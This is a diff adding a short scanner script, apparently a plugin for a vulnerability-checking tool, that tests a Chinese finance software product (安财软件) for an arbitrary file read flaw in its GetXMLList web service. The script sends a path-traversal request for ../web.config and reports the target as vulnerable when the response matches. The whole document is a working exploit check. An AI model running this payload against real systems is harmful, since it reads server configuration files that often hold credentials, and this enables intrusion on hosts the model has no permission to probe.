@@ -1,0 +1,13 @@
+#request url = var
+#define payload = /WS/WebServiceBase.asmx/GetXMLList
+#define bug = application/xml
+#define info = 存在安财软件GetXMLList任意文件读取漏洞
+
+function main(args)
+{
+	res = HttpPost(url.payload,"strXMLFileName=../web.config","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[1],bug,0)!= "-1")
+	{
+		print(url.info);
+	}
+}
